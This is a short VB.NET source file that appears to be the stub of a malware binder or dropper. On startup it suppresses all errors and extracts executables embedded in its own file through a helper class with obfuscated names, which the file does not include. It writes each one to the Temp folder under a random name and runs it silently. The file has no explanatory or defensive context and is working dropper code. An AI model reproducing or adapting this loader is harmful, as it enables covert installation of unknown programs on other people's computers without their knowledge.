Imports System.Text
Imports System.IO

Public Class Form1

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        On Error Resume Next
        Dim N As Integer = Encoding.UTF7.GetString(DtXErddcUVsV.znKEdivzxWDV(Application.ExecutablePath, 1))
        For i = 0 To N - 1
            Dim Target As String = My.Computer.FileSystem.SpecialDirectories.Temp & "\"
            Dim FileN As String = GenStr(35)
            File.WriteAllBytes(Target & FileN & ".exe", DtXErddcUVsV.Decompress(DtXErddcUVsV.znKEdivzxWDV(Application.ExecutablePath, i + 2)))
            Shell(Target & FileN & ".exe")
        Next
        End
    End Sub

    Public Function GenStr(ByVal lenght As Integer) As String
        Randomize()
        Dim s As New System.Text.StringBuilder("")
        Dim b() As Char = "A0B1C2D3E4F5G6H7I8J9KLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
End Class